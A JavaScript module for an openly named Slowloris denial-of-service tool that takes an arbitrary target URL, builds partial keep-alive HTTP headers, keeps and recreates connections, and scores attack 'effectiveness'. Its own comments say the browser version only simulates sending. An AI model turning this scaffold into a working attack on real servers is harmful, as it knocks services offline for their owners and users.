// ===== SLOWLORIS ATTACK =====
class SlowlorisAttack {
    constructor() {
        this.name = "Slowloris";
        this.version = "1.0";
        this.description = "Low-bandwidth DoS attack that uses partial HTTP requests";
        this.isAttacking = false;
        this.attackStats = null;
        this.connections = [];
        this.maxConnections = 150;
        
        this.init();
    }
    
    init() {
        hoopsteamLogger.info(`Tool initialized: ${this.name} v${this.version}`);
    }
    
    // Start Slowloris attack
    async startAttack(target, options = {}) {
        if (this.isAttacking) {
            throw new Error('Attack already in progress');
        }
        
        // Validate target
        if (!this.validateTarget(target)) {
            throw new Error('Invalid target URL');
        }
        
        this.isAttacking = true;
        
        // Default options
        const config = {
            duration: options.duration || 60, // seconds
            connections: Math.min(options.connections || 50, this.maxConnections),
            timeout: options.timeout || 10000,
            interval: options.interval || 15, // seconds between keep-alive headers
            socketTimeout: options.socketTimeout || 120, // seconds before socket timeout
            proxy: options.proxy || null
        };
        
        // Create attack stats
        this.attackStats = {
            id: 'slowloris_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
            target: target,
            config: config,
            startTime: new Date().toISOString(),
            status: 'running',
            stats: {
                totalConnections: 0,
                activeConnections: 0,
                failedConnections: 0,
                bytesSent: 0
            }
        };
        
        hoopsteamLogger.warning(`Starting Slowloris attack: ${target}`, {
            connections: config.connections,
            duration: config.duration
        });
        
        hoopsteamEvents.emit('tool:progress', {
            tool: 'slowloris',
            progress: 0,
            message: `Initializing Slowloris attack on ${target}`
        });
        
        try {
            // Parse target URL
            const url = new URL(target);
            const hostname = url.hostname;
            const port = url.port || (url.protocol === 'https:' ? 443 : 80);
            const path = url.pathname || '/';
            
            // Create connections
            for (let i = 0; i < config.connections && this.isAttacking; i++) {
                await this.createConnection(i, hostname, port, path, config);
                this.attackStats.stats.totalConnections++;
                this.attackStats.stats.activeConnections++;
                
                // Small delay between connection attempts
                await this.delay(100);
            }
            
            // Calculate total duration
            const totalDuration = config.duration * 1000;
            const startTime = Date.now();
            
            // Update progress
            const progressInterval = setInterval(() => {
                if (!this.isAttacking) {
                    clearInterval(progressInterval);
                    return;
                }
                
                const elapsed = Date.now() - startTime;
                const progress = Math.min((elapsed / totalDuration) * 100, 100);
                
                hoopsteamEvents.emit('tool:progress', {
                    tool: 'slowloris',
                    progress: progress,
                    message: `Maintaining ${this.attackStats.stats.activeConnections} connections`
                });
                
                // Check if duration completed
                if (elapsed >= totalDuration) {
                    this.stopAttack();
                    clearInterval(progressInterval);
                }
                
            }, 1000);
            
            // Store interval for cleanup
            this.progressInterval = progressInterval;
            
            return this.attackStats;
            
        } catch (error) {
            this.attackStats.status = 'error';
            this.attackStats.error = error.message;
            this.isAttacking = false;
            
            hoopsteamLogger.error(`Slowloris attack failed: ${target}`, error);
            
            hoopsteamEvents.emit('tool:error', {
                tool: 'slowloris',
                error: error.message
            });
            
            throw error;
        }
    }
    
    // Create and maintain a connection
    async createConnection(id, hostname, port, path, config) {
        const connection = {
            id: id,
            active: true,
            socket: null,
            lastActivity: Date.now(),
            bytesSent: 0,
            status: 'connecting'
        };
        
        this.connections.push(connection);
        
        try {
            // In browser environment, we simulate the attack
            // Real Slowloris would use raw sockets (not available in browser)
            
            connection.status = 'connected';
            
            // Simulate keeping connection alive
            const keepAliveInterval = setInterval(() => {
                if (!connection.active || !this.isAttacking) {
                    clearInterval(keepAliveInterval);
                    return;
                }
                
                // Send partial headers to keep connection alive
                this.sendPartialHeaders(connection, hostname, path);
                connection.lastActivity = Date.now();
                
            }, config.interval * 1000);
            
            // Monitor connection timeout
            const timeoutInterval = setInterval(() => {
                if (!connection.active || !this.isAttacking) {
                    clearInterval(timeoutInterval);
                    return;
                }
                
                const inactiveTime = Date.now() - connection.lastActivity;
                if (inactiveTime > config.socketTimeout * 1000) {
                    // Connection timed out, recreate it
                    clearInterval(keepAliveInterval);
                    clearInterval(timeoutInterval);
                    this.recreateConnection(id, hostname, port, path, config);
                }
                
            }, 5000);
            
            // Store intervals for cleanup
            connection.intervals = [keepAliveInterval, timeoutInterval];
            
        } catch (error) {
            connection.status = 'failed';
            connection.error = error.message;
            this.attackStats.stats.failedConnections++;
            this.attackStats.stats.activeConnections--;
        }
    }
    
    // Send partial HTTP headers (simulated)
    sendPartialHeaders(connection, hostname, path) {
        // Construct partial HTTP request
        const headers = [
            `GET ${path} HTTP/1.1\r\n`,
            `Host: ${hostname}\r\n`,
            `User-Agent: Slowloris/1.0\r\n`,
            `Connection: keep-alive\r\n`,
            `Keep-Alive: timeout=120\r\n`,
            `X-a: ${Math.random().toString(36).substr(2)}\r\n`
        ];
        
        // Send headers one by one with delays (simulated)
        headers.forEach((header, index) => {
            setTimeout(() => {
                if (connection.active) {
                    const bytes = header.length;
                    connection.bytesSent += bytes;
                    this.attackStats.stats.bytesSent += bytes;
                }
            }, index * 1000);
        });
    }
    
    // Recreate failed connection
    recreateConnection(id, hostname, port, path, config) {
        // Remove old connection
        const index = this.connections.findIndex(c => c.id === id);
        if (index !== -1) {
            const oldConn = this.connections[index];
            oldConn.active = false;
            
            // Clear intervals
            if (oldConn.intervals) {
                oldConn.intervals.forEach(clearInterval);
            }
            
            this.connections.splice(index, 1);
            this.attackStats.stats.activeConnections--;
        }
        
        // Create new connection after delay
        setTimeout(() => {
            if (this.isAttacking) {
                this.createConnection(id, hostname, port, path, config);
                this.attackStats.stats.totalConnections++;
                this.attackStats.stats.activeConnections++;
            }
        }, 5000);
    }
    
    // Validate target URL
    validateTarget(target) {
        try {
            const url = new URL(target);
            return url.protocol === 'http:' || url.protocol === 'https:';
        } catch (error) {
            return false;
        }
    }
    
    // Stop attack
    stopAttack() {
        if (!this.isAttacking) return false;
        
        this.isAttacking = false;
        
        // Close all connections
        this.connections.forEach(connection => {
            connection.active = false;
            
            // Clear intervals
            if (connection.intervals) {
                connection.intervals.forEach(clearInterval);
            }
        });
        
        // Clear progress interval
        if (this.progressInterval) {
            clearInterval(this.progressInterval);
        }
        
        // Update attack stats
        if (this.attackStats) {
            this.attackStats.status = 'stopped';
            this.attackStats.endTime = new Date().toISOString();
            this.attackStats.duration = Date.now() - new Date(this.attackStats.startTime).getTime();
        }
        
        hoopsteamLogger.info(`Slowloris attack stopped`, {
            activeConnections: this.attackStats?.stats.activeConnections || 0,
            duration: this.attackStats?.duration || 0
        });
        
        hoopsteamEvents.emit('tool:complete', {
            tool: 'slowloris',
            attack: this.attackStats,
            stopped: true
        });
        
        return true;
    }
    
    // Get attack statistics
    getStats() {
        if (!this.attackStats) return null;
        
        const active = this.connections.filter(c => c.active).length;
        
        return {
            ...this.attackStats.stats,
            activeConnections: active,
            duration: this.attackStats.duration || 0,
            connectionSuccessRate: this.attackStats.stats.totalConnections > 0 ? 
                ((this.attackStats.stats.totalConnections - this.attackStats.stats.failedConnections) / 
                 this.attackStats.stats.totalConnections * 100).toFixed(2) + '%' : '0%'
        };
    }
    
    // Generate attack report
    generateReport() {
        if (!this.attackStats) return null;
        
        const stats = this.attackStats.stats;
        const duration = this.attackStats.duration ? (this.attackStats.duration / 1000).toFixed(2) + 's' : 'N/A';
        
        return {
            summary: {
                target: this.attackStats.target,
                duration: duration,
                status: this.attackStats.status,
                startTime: this.attackStats.startTime,
                endTime: this.attackStats.endTime || 'N/A'
            },
            statistics: {
                totalConnections: stats.totalConnections,
                activeConnections: stats.activeConnections,
                failedConnections: stats.failedConnections,
                connectionSuccessRate: this.attackStats.stats.totalConnections > 0 ? 
                    ((stats.totalConnections - stats.failedConnections) / stats.totalConnections * 100).toFixed(2) + '%' : '0%',
                bytesSent: this.formatBytes(stats.bytesSent),
                bandwidth: this.calculateBandwidth(stats.bytesSent, this.attackStats.duration)
            },
            connections: this.connections.slice(0, 20).map(conn => ({
                id: conn.id,
                status: conn.status,
                bytesSent: this.formatBytes(conn.bytesSent),
                active: conn.active ? 'Yes' : 'No'
            })),
            effectiveness: this.calculateEffectiveness()
        };
    }
    
    // Calculate bandwidth
    calculateBandwidth(bytes, durationMs) {
        if (!durationMs || durationMs === 0) return '0 B/s';
        
        const durationSeconds = durationMs / 1000;
        const bytesPerSecond = bytes / durationSeconds;
        
        return this.formatBytes(bytesPerSecond) + '/s';
    }
    
    // Format bytes to human readable
    formatBytes(bytes) {
        if (bytes === 0) return '0 Bytes';
        
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }
    
    // Calculate attack effectiveness
    calculateEffectiveness() {
        if (!this.attackStats) return 'Low';
        
        const active = this.connections.filter(c => c.active).length;
        const target = this.attackStats.config.connections;
        
        const successRate = (active / target) * 100;
        
        if (successRate > 80) return 'Very High';
        if (successRate > 60) return 'High';
        if (successRate > 40) return 'Medium';
        if (successRate > 20) return 'Low';
        return 'Very Low';
    }
    
    // Utility: Delay
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// Create global instance
const slowlorisAttack = new SlowlorisAttack();

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = slowlorisAttack;
}